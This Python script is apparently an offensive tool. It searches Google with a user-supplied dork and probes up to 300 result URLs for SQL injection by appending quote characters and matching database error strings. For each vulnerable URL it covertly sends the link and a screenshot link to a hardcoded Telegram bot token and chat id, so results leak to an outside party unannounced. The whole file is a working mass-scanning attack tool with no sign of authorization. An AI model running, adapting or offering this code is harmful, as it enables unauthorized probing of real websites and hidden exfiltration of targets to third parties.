import time,os
from googlesearch import *
from requests import *
from user_agent import generate_user_agent
from colorama import Fore

os.system('pip install google;clear')

G = Fore.GREEN
B = Fore.BLUE
Y = Fore.YELLOW
R = Fore.RED
W= Fore.WHITE
C = Fore.CYAN
M = Fore.MAGENTA
s = Session()
s.headers["User-Agent"] = generate_user_agent()
logo = """
\033[2;33m]     █                      █                             █
   ▄▄▄█   ▄▄▄    ▄▄▄    ▄▄▄█          ▄▄▄    ▄▄▄     ▄▄▄█   ▄▄▄
  █▀ ▀█  █▀  █  ▀   █  █▀ ▀█         █▀  ▀  █▀ ▀█  █▀ ▀█  █▀  █
 \033[2;31m █   █  █▀▀▀▀  ▄▀▀▀█  █   █         █      █   █  █   █  █▀▀▀▀
  ▀█▄██  ▀█▄▄▀  ▀▄▄▀█  ▀█▄██         ▀█▄▄▀  ▀█▄█▀  ▀█▄██  ▀█▄▄▀
"""
print(logo,'\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------')
#--------------------start code--------------------#
def sql(url):
    try:    
        ur = get(url+"'").status_code
        if ur == 200:
            r = get(url+"'").text
            if 'SQL' in str(r):
                    for c in "\"'":
                        new_url = f"{url}{c}"
                        print("[!] Trying", new_url)
                        res = s.get(new_url)
                        if is_vulnerable(res):
                            print("[+] SQL Injection vulnerability detected, link : ", url)
                            img = f'https://mr-abood.herokuapp.com/Screenshot/API?Link={url}'
                            get(f'https://api.telegram.org/bot5721933211:AAHjGWMKYVEqa26KKUCRThWziBMI5-nxV_8/sendPhoto?chat_id=5599536745&photo={img}&caption=هذا الموقع قد يكون مصاب بثغرة sql \n {url} ')
                        else:
                                                    pass
                                                    
                    print(B+' [ ✔ ] '+G+f'Found Sql Url {W}( {Y}{url}{W} )')                
                
                    time.sleep(1)
                    print("")
            else:
                print(Y+' [ ✘ ] '+C+f'Not Sql Url {W}( {B}{url}{W} )')
                time.sleep(1)
                print("")                            
        else:
            print(B+' [ ✘ ] '+R+f'Not Found Url {W}( {M}{url}{W} )')
            time.sleep(1)            
            print("")            
    except:
        print('\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\n')        
        serch()
#-----------------------response------------------------#        
def is_vulnerable(response):
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False
#--------------------google search--------------------#        
def serch():
    dead = input(B+' [ ✪ ] '+C+'Enter search : '+W)
    print('\n \033[0;90m--------------------\033[2;32mhttps://t.me/black_code_22\033[0;90m--------------------\n')
    for url in search(dead,stop = 300):
        sql(url)
if __name__ == "__main__":
    serch()                                  
